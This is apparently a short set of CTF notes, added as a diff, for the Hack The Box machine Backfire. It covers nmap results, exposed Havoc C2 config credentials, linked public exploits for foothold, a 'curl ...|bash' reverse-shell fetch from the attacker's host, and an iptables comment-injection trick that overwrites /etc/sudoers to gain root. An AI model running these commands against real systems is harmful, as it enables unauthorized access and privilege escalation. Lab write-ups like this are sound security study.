@@ -1,0 +1,80 @@
+***Nmap***
+
+Nmap scan report for 10.10.11.49
+Host is up (0.51s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+| ssh-hostkey:
+|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
+|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
+443/tcp  open     https
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=127.0.0.1/organizationName=SYNERGY CORP/stateOrProvinceName=Washington/countryName=US
+| Subject Alternative Name: IP Address:127.0.0.1
+| Issuer: commonName=127.0.0.1/organizationName=SYNERGY CORP/stateOrProvinceName=Washington/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-07-08T22:23:29
+| Not valid after:  2027-07-08T22:23:29
+| MD5:   40cc:90d5:8bc1:be54:1d72:354a:67de:5402
+|SHA-1: 72ce:50df:3de2:9db2:1d6e:a031:b72f:e667:338d:71d6
+| tls-alpn:
+|   http/1.1
+|   http/1.0
+|  http/0.9
+|http-title: 404 Not Found
+5000/tcp filtered upnp
+8000/tcp open     http-alt
+|http-title: Index of /
+| http-methods:
+|  Supported Methods: GET HEAD POST
+| http-ls: Volume /
+| SIZE  TIME               FILENAME
+| 1559  17-Dec-2024 12:31  disable_tls.patch
+| 875   17-Dec-2024 12:34  havoc.yaotl
+|
+|_http-open-proxy: Proxy might be redirecting requests
+
+
+
+# 2 files on index of /
+─# file havoc.yaotl
+havoc.yaotl: ASCII text
+
+┌──(root㉿kali)-[/home/cyberacc/Desktop/Backfire]
+└─# file disable_tls.patch
+disable_tls.patch: unified diff output text, 1st line "Disable TLS for Websocket management port 40056, so I can prove that", 2nd line "sergej is not doing any work", 3rd line "Management port only allows local connections (we use ssh forwarding) so ", ASCII text
+
+possible user: sergej
+
+# operators/possible users
+
+Operators {
+user "ilya" {
+Password = "Cobaltxxxxxxxxxx"
+}
+
+user "sergej" {
+    Password = "1w4nt2sxxxxxxxxxxxxxxxxxx"
+}
+
+
+***Foothold***
+  Havoc SSRF to RCE exploit to gain access as ilya --> https://github.com/kit4py/CVE-2024-41570
+
+local service running on port 7096
+hardhat c2 auth bypass --> https://github.com/thisisveryfunny/HardHat-C2-Auth-Bypass/blob/main/README.md
+
+
+Then on terminal we can run commands as sergej
+
+Put a revshell on [localhost](http://localhost) first. a [revshell.sh](http://revshell.sh) on the directory and set up http server on port 8000. Then from the terminal of hardhat c2 run curl http://<ourIP>:<port>/revshell.sh|bash
+
+you should receive a callback on our machine as sergej.
+
+Then copy your public key imediatelly to sergej authorized_keys!!! You have a more stable shell now. Then sudo -l will give information about how to leverage iptables to privesc.
+  sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nsergej ALL=(ALL) NOPASSWD:ALL\n'
+sudo iptables-save -f /etc/sudoers
+  After that, run sudo -l again and you should see sergej is now able to perform everything as sudo. So, just sudo su and you are root!!!
